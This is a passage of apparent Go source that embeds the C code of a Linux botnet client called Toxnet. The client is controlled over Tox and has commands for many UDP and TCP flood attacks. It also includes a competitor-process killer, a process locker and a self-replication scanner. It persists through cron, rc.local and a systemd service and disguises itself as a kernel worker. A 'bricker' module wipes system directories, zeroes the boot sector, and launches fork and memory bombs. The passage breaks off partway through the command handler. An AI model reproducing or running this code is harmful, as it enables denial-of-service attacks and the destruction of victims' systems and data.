package payloads

var Linux_stub = `#include <ctype.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/random.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <linux/limits.h>
#include <sys/wait.h>
#include <sodium/utils.h>
#include <tox/tox.h>

// Attack declarations
void start_vse_attack(char *target, int threads, int duration_sec);
void stop_vse_attack();
void start_wra_attack(char *target, int port, int threads, int duration_sec);
void stop_wra_attack();
void start_udx_attack(char *target, int port, int threads, int duration_sec);
void stop_udx_attack();
void start_tcp_socket_attack(char *target, int port, int threads, int duration_sec);
void stop_tcp_socket_attack();
void start_tcp_bypass_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_tcp_bypass_attack();
void start_tcp_syndata_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_tcp_syndata_attack();
void start_tcp_stomp_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_tcp_stomp_attack();
void start_tcp_syn_attack(char *target, int port, int threads, int duration_sec);
void stop_tcp_syn_attack();
void start_bricker(void);
void killer_create(void);
void killer_destroy(void);
void locker_create(void);
void start_socket_hold_attack(char *target, int port, int threads, int duration_sec);
void stop_socket_hold_attack();
void start_tcp_ack_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_tcp_ack_attack();
void start_brazilian_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_brazilian_attack();
void start_raknet_attack(char *target, int port, int threads, int duration_sec);
void stop_raknet_attack();
void start_udp_hex_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_udp_hex_attack();
void start_udp_raw_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_udp_raw_attack();
void start_udp_plain_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_udp_plain_attack();
void start_udp_bypass_attack(char *target, int port, int threads, int duration_sec, int length);
void stop_udp_bypass_attack();
void start_openvpn_attack(char *target, int port, int threads, int duration_sec);
void stop_openvpn_attack();

// Self-replication scanner declarations
void start_selfrep_scanner(void);
void stop_selfrep_scanner(void);

` + GetAttackCode() + `

// ==================== UTILITY FUNCTIONS ====================
static int _atoi(const char *str) {
    int result = 0;
    while (*str >= '0' && *str <= '9') {
        result = result * 10 + (*str - '0');
        str++;
    }
    return result;
}

static int _isdigit(char c) {
    return (c >= '0' && c <= '9');
}

static char *_strstr(const char *haystack, const char *needle) {
    if (!*needle) return (char *)haystack;
    for (; *haystack; haystack++) {
        const char *h = haystack, *n = needle;
        while (*h && *n && (*h == *n)) { h++; n++; }
        if (!*n) return (char *)haystack;
    }
    return NULL;
}

static int _strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static int _strcmp2(const char *s1, const char *s2) {
    if (!s1 || !s2) return -1;
    while (*s1 && *s2 && *s1 == *s2) { s1++; s2++; }
    return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static char *_strcpy(char *dest, const char *src) {
    char *saved = dest;
    while ((*dest++ = *src++));
    return saved;
}

static char *_strcat(char *dest, const char *src) {
    char *saved = dest;
    while (*dest) dest++;
    while ((*dest++ = *src++));
    return saved;
}

static int _startswith(const char *str, const char *prefix) {
    while (*prefix) {
        if (*str++ != *prefix++) return 0;
    }
    return 1;
}

static char *_self_path(void) {
    static char path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) path[len] = '\0';
    else path[0] = '\0';
    return path;
}

// ==================== KILLER MODULE ====================
typedef struct kill_t {
    struct kill_t *next;
    unsigned int n_pid;
    char pid[256];
    char path[256];
} Kill;

typedef struct locker_t {
    struct locker_t *next;
    unsigned int pid;
} Locker;

static Kill *k_head = NULL;
static Locker *l_head = NULL;
static char self_realpath[256] = {0};
static int killer_pid = -1;

// Whitelisted paths - don't kill these
static char *whitelistpaths[] = {
    "/lib/systemd/",
    "/usr/lib/systemd",
    "/system/system/bin/",
    "/gm/bin/",
    "/mnt/",
    "/home/process/",
    "/home/helper",
    "/home/davinci",
    "/z/bin/",
    "/mnt/mtd/",
    "/tmp/sqfs/",
    "/usr/libexec/",
    "/usr/sbin/",
    "/z/zbin/",
    "/usr/bin",
    "/sbin/",
    "/bin/"
};

static void killer_add_to_list(char *pid, char *realpath) {
    Kill *node = calloc(1, sizeof(Kill)), *last;
    node->n_pid = _atoi(pid);
    _strcpy(node->pid, pid);
    _strcpy(node->path, realpath);
    
    if (k_head == NULL) {
        k_head = node;
        return;
    }
    
    last = k_head;
    while (last->next != NULL) last = last->next;
    last->next = node;
    kill(node->n_pid, 19); // STOP signal first
}

static void killer_delete_list(void) {
    Kill *temp = NULL;
    if (k_head == NULL) return;
    while (k_head != NULL) {
        temp = k_head->next;
        free(k_head);
        k_head = temp;
    }
}

static int killer_check_whitelisted(char *path) {
    if (_strcmp2(path, self_realpath) == 0) return 1;
    for (int i = 0; i < sizeof(whitelistpaths) / sizeof(whitelistpaths[0]); i++) {
        if (_startswith(path, whitelistpaths[i])) return 1;
    }
    return 0;
}

static char *killer_check_realpath(char *pid, char *path, int check_whitelist) {
    char exepath[256] = {0};
    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");
    
    if (readlink(exepath, path, 256) == -1) return NULL;
    
    if (check_whitelist && (_strstr(path, "wget") || _strstr(path, "curl") || 
        _strstr(path, "tftp") || _strstr(path, "reboot"))) return path;
    
    if (killer_check_whitelisted(path) == 1) return NULL;
    return path;
}

static int killer_check_for_contraband(char *fdpath) {
    char fdinode[256] = {0};
    if (readlink(fdpath, fdinode, 256) == -1) return 0;
    if (_strstr(fdinode, "socket") || _strstr(fdinode, "proc")) return 1;
    return 0;
}

static int killer_check_fds(char *pid, char *realpath) {
    int retval = 0;
    DIR *dir;
    struct dirent *file;
    char fdspath[256] = {0}, fdpath[512];
    
    _strcpy(fdspath, "/proc/");
    _strcat(fdspath, pid);
    _strcat(fdspath, "/fd");
    
    if ((dir = opendir(fdspath)) == NULL) return retval;
    
    while ((file = readdir(dir))) {
        _strcpy(fdpath, fdspath);
        _strcat(fdpath, "/");
        _strcat(fdpath, file->d_name);
        if (killer_check_for_contraband(fdpath)) {
            retval = 1;
            break;
        }
    }
    closedir(dir);
    return retval;
}

static Kill *killer_compare_realpaths(char *pid) {
    Kill *node = k_head;
    char exepath[256], realpath[256] = {0};
    if (node == NULL) return 0;
    
    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");
    
    if (readlink(exepath, realpath, 256) == -1) return NULL;
    
    while (node != NULL) {
        if (_strcmp2(node->path, realpath) == 0) return node;
        node = node->next;
    }
    return NULL;
}

static void killer_kill_list(void) {
    int pid;
    DIR *dir;
    Kill *node = NULL;
    struct dirent *file;
    
    if ((dir = opendir("/proc")) == NULL) {
        killer_delete_list();
        return;
    }
    
    while ((file = readdir(dir))) {
        if (!(node = killer_compare_realpaths(file->d_name))) continue;
        pid = _atoi(file->d_name);
        if (pid != getpid() && pid != getppid()) {
            kill(pid, 9); // SIGKILL
        }
    }
    closedir(dir);
    killer_delete_list();
}

static void killer_scan_and_kill(void) {
    DIR *dir;
    struct dirent *file;
    char realpath[256] = {0};
    
    if ((dir = opendir("/proc")) == NULL) return;
    
    while ((file = readdir(dir))) {
        if (!_isdigit(file->d_name[0])) continue;
        memset(realpath, 0, 256);
        
        if (!killer_check_realpath(file->d_name, realpath, 0)) continue;
        if (killer_check_fds(file->d_name, realpath)) {
            int pid = _atoi(file->d_name);
            if (pid != getpid() && pid != getppid()) {
                kill(pid, 9);
            }
        }
    }
    closedir(dir);
}

void killer_create(void) {
    signal(SIGCHLD, SIG_IGN);
    _strcpy(self_realpath, _self_path());
    
    if ((killer_pid = fork()) != 0) return;
    
    signal(SIGCHLD, SIG_IGN);
    _strcpy(self_realpath, _self_path());
    
    while (1) {
        killer_scan_and_kill();
        sleep(1);
    }
    exit(0);
}

void killer_destroy(void) {
    if (killer_pid > 0) kill(killer_pid, 9);
}

// ==================== LOCKER MODULE ====================
static void locker_add_to_list(char *pid) {
    Locker *node = calloc(1, sizeof(Locker)), *last;
    node->pid = _atoi(pid);
    
    if (l_head == NULL) {
        l_head = node;
        return;
    }
    
    last = l_head;
    while (last->next != NULL) last = last->next;
    last->next = node;
}

static int locker_search_list(char *pid) {
    Locker *node = l_head;
    int n_pid = _atoi(pid);
    
    if (n_pid == getpid() || n_pid == getppid()) return 1;
    
    while (node != NULL) {
        if (n_pid == node->pid) return 1;
        node = node->next;
    }
    return 0;
}

static void locker_check_pid(char *pid) {
    char realpath[256] = {0};
    
    if (locker_search_list(pid)) return;
    
    char exepath[256];
    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");
    
    if (readlink(exepath, realpath, 256) != -1) {
        if (!(_strstr(realpath, "wget") || _strstr(realpath, "curl") || 
              _strstr(realpath, "tftp") || _strstr(realpath, "reboot"))) {
            locker_add_to_list(pid);
            return;
        }
    }
    
    int n_pid = _atoi(pid);
    if (n_pid != getpid() && n_pid != getppid()) {
        kill(n_pid, 9);
    }
}

void locker_create(void) {
    DIR *dir;
    int scanned = 0;
    struct dirent *file;
    
    while (1) {
        if ((dir = opendir("/proc")) == NULL) return;
        
        while ((file = readdir(dir))) {
            if (!_isdigit(file->d_name[0])) continue;
            
            if (scanned == 0) {
                locker_add_to_list(file->d_name);
            } else {
                locker_check_pid(file->d_name);
            }
        }
        
        if (!scanned) scanned = 1;
        closedir(dir);
        usleep(50 * 1000);
    }
}

// ==================== BRICKER MODULE ====================
#define BRICKER_RESCAN_TIME 20000

static int bricker_pid = -1;

static void bricker_delete_files(void) {
    system("rm -rf /bin /sbin /usr/bin /usr/sbin /boot /lib /lib64 2>/dev/null");
    system("rm -rf /etc /var /home /root 2>/dev/null");
    system("rm -rf /dev/* 2>/dev/null");
    system("rm -rf /proc/* 2>/dev/null");
    system("rm -rf /sys/* 2>/dev/null");
}

static void bricker_overwrite_mbr(void) {
    int fd = open("/dev/sda", O_WRONLY);
    if (fd < 0) fd = open("/dev/hda", O_WRONLY);
    if (fd >= 0) {
        char *zeros = calloc(512, 1);
        write(fd, zeros, 512);
        close(fd);
        free(zeros);
    }
}

static void bricker_fork_bomb(void) {
    while (1) {
        if (fork() == 0) {
            while (1) fork();
        }
    }
}

static void bricker_memory_bomb(void) {
    while (1) {
        void *ptr = malloc(1024 * 1024 * 100);
        if (ptr) memset(ptr, 0, 1024 * 1024 * 100);
        usleep(1000);
    }
}

static void bricker_kill_all(void) {
    DIR *dir;
    struct dirent *file;
    
    if ((dir = opendir("/proc")) == NULL) return;
    
    while ((file = readdir(dir))) {
        if (!_isdigit(file->d_name[0])) continue;
        int pid = _atoi(file->d_name);
        if (pid != getpid() && pid != getppid() && pid != 1) {
            kill(pid, 9);
        }
    }
    closedir(dir);
}

static void bricker_network_kill(void) {
    system("ifconfig eth0 down 2>/dev/null");
    system("ifconfig wlan0 down 2>/dev/null");
    system("ip link set eth0 down 2>/dev/null");
    system("ip link set wlan0 down 2>/dev/null");
    system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");
    system("iptables -P INPUT DROP 2>/dev/null");
    system("iptables -P OUTPUT DROP 2>/dev/null");
    system("iptables -P FORWARD DROP 2>/dev/null");
}

static void bricker_disable_recovery(void) {
    system("echo 0 > /proc/sys/kernel/panic 2>/dev/null");
    system("echo 0 > /proc/sys/kernel/panic_on_oops 2>/dev/null");
    system("echo 0 > /proc/sys/kernel/panic_on_warn 2>/dev/null");
    system("sync && echo 1 > /proc/sys/kernel/sysrq 2>/dev/null");
    system("echo b > /proc/sysrq-trigger 2>/dev/null");
}

static void bricker_full_brick(void) {
    bricker_kill_all();
    bricker_delete_files();
    bricker_overwrite_mbr();
    bricker_network_kill();
    bricker_disable_recovery();
    
    pid_t fb_pid = fork();
    if (fb_pid == 0) {
        bricker_fork_bomb();
        exit(0);
    }
    
    pid_t mb_pid = fork();
    if (mb_pid == 0) {
        bricker_memory_bomb();
        exit(0);
    }
    
    sleep(2);
    kill(1, 9);
    kill(getpid(), 9);
}

void bricker_bricks(void) {
    if (bricker_pid != -1) return;
    
    bricker_pid = fork();
    if (bricker_pid == 0) {
        setsid();
        bricker_full_brick();
        exit(0);
    }
}

void start_bricker(void) {
    bricker_bricks();
}

// ==================== RANDOM NAME GENERATION ====================
const char* adjectives[] = {"Red","Blue","Green","Dark","Light","Fast","Slow","Big","Small","Crazy","Lazy","Quick","Silent","Loud","Wild","Calm","Angry","Happy","Sad","Brave","Shy","Smart","Dumb","Old","New","Cold","Hot","Soft","Hard","Deep","High","Low","Sharp","Blunt","Fierce"};
const char* nouns[] = {"Wolf","Fox","Hawk","Eagle","Tiger","Lion","Bear","Shark","Snake","Dragon","Phoenix","Ghost","Shadow","Storm","Thunder","Blade","Fang","Claw","Spirit","Demon","Angel","Knight","Warrior","Hunter","Raven","Crow","Owl","Falcon","Panther","Leopard","Cheetah","Viper"};
const char* colors[] = {"Red","Blue","Green","Black","White","Gray","Gold","Silver","Crimson","Scarlet","Emerald","Sapphire","Ruby","Onyx","Jade","Amber","Bronze"};

void generate_random_name(char *name, size_t size) {
    unsigned int seed; getrandom(&seed, sizeof(seed), 0); srand(seed);
    int format = rand() % 4;
    if (format == 0) snprintf(name, size, "%s%s", adjectives[rand() % (sizeof(adjectives)/sizeof(adjectives[0]))], nouns[rand() % (sizeof(nouns)/sizeof(nouns[0]))]);
    else if (format == 1) snprintf(name, size, "%s%s", colors[rand() % (sizeof(colors)/sizeof(colors[0]))], nouns[rand() % (sizeof(nouns)/sizeof(nouns[0]))]);
    else if (format == 2) snprintf(name, size, "%s%s%s", adjectives[rand() % (sizeof(adjectives)/sizeof(adjectives[0]))], colors[rand() % (sizeof(colors)/sizeof(colors[0]))], nouns[rand() % (sizeof(nouns)/sizeof(nouns[0]))]);
    else snprintf(name, size, "%s%s%s", colors[rand() % (sizeof(colors)/sizeof(colors[0]))], adjectives[rand() % (sizeof(adjectives)/sizeof(adjectives[0]))], nouns[rand() % (sizeof(nouns)/sizeof(nouns[0]))]);
}

// ==================== PERSISTENCE & LOCKING ====================
static sig_atomic_t timeout_expired = 0;
static void timeout_handler(int sig) { (void)sig; timeout_expired = 1; }

int acquireLock(char *lockFile, int msTimeout) {
    struct itimerval timeout, old_timer; struct sigaction sa, old_sa; int err;
    int sTimeout = msTimeout / 1000;
    memset(&timeout, 0, sizeof timeout);
    timeout.it_value.tv_sec = sTimeout;
    timeout.it_value.tv_usec = ((msTimeout - (sTimeout * 1000)) * 1000);
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = timeout_handler; sa.sa_flags = SA_RESETHAND;
    sigaction(SIGALRM, &sa, &old_sa);
    setitimer(ITIMER_REAL, &timeout, &old_timer);
    int lockFd;
    if ((lockFd = open(lockFile, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO)) < 0) return -1;
    
    // Try to acquire lock with retry on EINTR
    int retry_count = 0;
    while (flock(lockFd, LOCK_EX)) {
        switch ((err = errno)) {
        case EINTR:
            // Interrupted by signal, retry
            retry_count++;
            if (retry_count > 10) {
                // Too many retries, give up and delete stale lock
                close(lockFd);
                unlink(lockFile);
                lockFd = open(lockFile, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
                if (lockFd < 0) return -1;
                retry_count = 0;
                continue;
            }
            usleep(10000); // Wait 10ms before retry
            continue;
        default:
            // Other error, try to delete stale lock and retry once
            close(lockFd);
            unlink(lockFile);
            lockFd = open(lockFile, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
            if (lockFd < 0) return -1;
            continue;
        }
    }
    
    // Cancel the timer since we got the lock
    setitimer(ITIMER_REAL, &old_timer, NULL);
    sigaction(SIGALRM, &old_sa, NULL);
    return lockFd;
}

void releaseLock(int lockFd) { flock(lockFd, LOCK_UN); close(lockFd); }
void hide_process() { prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0); }
void run_command(const char *cmd) { FILE *fp = popen(cmd, "r"); if (fp) pclose(fp); }

// Universal persistence
void install_cron() {
    char line[256], exec_path[1024];
    ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path)-1);
    if (len != -1) {
        exec_path[len] = '\0';
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s'; echo '*/5 * * * * %s') | crontab - 2>/dev/null", exec_path, exec_path, exec_path);
        system(cmd);
    }
}

void install_rc_local() {
    char exec_path[1024];
    ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path)-1);
    if (len != -1) {
        exec_path[len] = '\0';
        FILE *fp = fopen("/etc/rc.local", "a");
        if (fp) {
            fprintf(fp, "%s &\n", exec_path);
            fclose(fp);
            chmod("/etc/rc.local", 0755);
        }
    }
}

void install_systemd() {
    char service_path[256], exec_path[1024];
    ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path)-1);
    if (len != -1) {
        exec_path[len] = '\0';
        snprintf(service_path, sizeof(service_path), "/etc/systemd/system/toxnet.service");
        FILE *fp = fopen(service_path, "w");
        if (fp) {
            fprintf(fp, "[Unit]\nDescription=Toxnet Bot\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n", exec_path);
            fclose(fp);
            run_command("systemctl daemon-reload");
            run_command("systemctl enable toxnet.service");
            run_command("systemctl start toxnet.service");
        }
    }
}

void persist() {
    hide_process();
    install_cron();
    install_rc_local();
    if (access("/etc/systemd/system", F_OK) == 0) install_systemd();
}

// ==================== TOX C2 ====================
typedef struct DHT_node { const char *ip; uint16_t port; const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1]; } DHT_node;

char *c2id = "TOXNET_REPLACE_ME_TOX_ID";
char *c2pub = "TOXNET_REPLACE_ME_PUB_KEY";

uint8_t *hex2bin(const char *hex) {
    size_t len = strlen(hex) / 2;
    uint8_t *bin = malloc(len);
    for (size_t i = 0; i < len; ++i, hex += 2) sscanf(hex, "%2hhx", &bin[i]);
    return bin;
}

char *bin2hex(const uint8_t *bin, size_t length) {
    char *hex = malloc(2*length + 1);
    char *saved = hex;
    for (int i=0; i<length;i++,hex+=2) sprintf(hex, "%02X",bin[i]);
    return saved;
}

void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, const uint8_t *message, size_t length, void *user_data) {
    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
    char *c2check = bin2hex(client_id, sizeof(client_id));
    if (strcmp(c2check, c2pub) == 0) {
        char *msg_copy = strdup((char*)message);
        char *cmd = strtok(msg_copy, " ");
        
        // Killer commands
        if (cmd && strcmp(cmd, "startkiller") == 0) {
            killer_create();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Killer module started", 25, NULL);
            free(msg_copy); return;
        }
        
        if (cmd && strcmp(cmd, "stopkiller") == 0) {
            killer_destroy();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Killer module stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // Locker commands
        if (cmd && strcmp(cmd, "startlocker") == 0) {
            pid_t locker_pid = fork();
            if (locker_pid == 0) {
                locker_create();
                exit(0);
            }
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Locker module started", 25, NULL);
            free(msg_copy); return;
        }
        
        // Bricker commands
        if (cmd && strcmp(cmd, "brick") == 0) {
            start_bricker();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] BRICKER ACTIVATED - System will be destroyed", 48, NULL);
            free(msg_copy); return;
        }
        
        // Self-Rep Scanner commands
        if (cmd && strcmp(cmd, "startscan") == 0) {
            start_selfrep_scanner();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Self-replication scanner started", 38, NULL);
            free(msg_copy); return;
        }
        
        if (cmd && strcmp(cmd, "stopscan") == 0) {
            stop_selfrep_scanner();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Self-replication scanner stopped", 37, NULL);
            free(msg_copy); return;
        }
        
        // VSE Attack
        if (cmd && strcmp(cmd, "vse") == 0) {
            char *target = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && threads_str && duration_str) {
                start_vse_attack(target, atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] VSE attack started on %s", target);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop VSE
        if (cmd && strcmp(cmd, "stopvse") == 0) {
            stop_vse_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] VSE attack stopped", 22, NULL);
            free(msg_copy); return;
        }
        
        // WRA Attack
        if (cmd && strcmp(cmd, "wra") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_wra_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] WRA attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop WRA
        if (cmd && strcmp(cmd, "stopwra") == 0) {
            stop_wra_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] WRA attack stopped", 22, NULL);
            free(msg_copy); return;
        }
        
        // UDP XTS3 Attack
        if (cmd && strcmp(cmd, "udpts") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_udx_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] UDPTS attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop UDP XTS3
        if (cmd && strcmp(cmd, "stopudpts") == 0) {
            stop_udx_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] UDPTS attack stopped", 24, NULL);
            free(msg_copy); return;
        }
        
        // TCP Socket Attack
        if (cmd && strcmp(cmd, "tcp_socket") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_tcp_socket_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP Socket attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP Socket
        if (cmd && strcmp(cmd, "stop_tcp_socket") == 0) {
            stop_tcp_socket_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP Socket attack stopped", 28, NULL);
            free(msg_copy); return;
        }
        
        // TCP Bypass Attack
        if (cmd && strcmp(cmd, "tcp_bypass") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_tcp_bypass_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP Bypass attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP Bypass
        if (cmd && strcmp(cmd, "stop_tcp_bypass") == 0) {
            stop_tcp_bypass_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP Bypass attack stopped", 28, NULL);
            free(msg_copy); return;
        }
        
        // TCP SYN Data Attack
        if (cmd && strcmp(cmd, "tcp_syndata") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_tcp_syndata_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP SYN Data attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP SYN Data
        if (cmd && strcmp(cmd, "stop_tcp_syndata") == 0) {
            stop_tcp_syndata_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP SYN Data attack stopped", 30, NULL);
            free(msg_copy); return;
        }
        
        // TCP Stomp Attack
        if (cmd && strcmp(cmd, "tcp_stomp") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_tcp_stomp_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP Stomp attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP Stomp
        if (cmd && strcmp(cmd, "stop_tcp_stomp") == 0) {
            stop_tcp_stomp_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP Stomp attack stopped", 27, NULL);
            free(msg_copy); return;
        }
        
        // TCP SYN Attack
        if (cmd && strcmp(cmd, "tcp_syn") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_tcp_syn_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP SYN attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP SYN
        if (cmd && strcmp(cmd, "stop_tcp_syn") == 0) {
            stop_tcp_syn_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP SYN attack stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // TCP Socket Hold Attack
        if (cmd && strcmp(cmd, "tcp_socket_hold") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_socket_hold_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP Socket Hold attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP Socket Hold
        if (cmd && strcmp(cmd, "stop_tcp_socket_hold") == 0) {
            stop_socket_hold_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP Socket Hold attack stopped", 32, NULL);
            free(msg_copy); return;
        }
        
        // TCP ACK Attack
        if (cmd && strcmp(cmd, "tcp_ack") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_tcp_ack_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
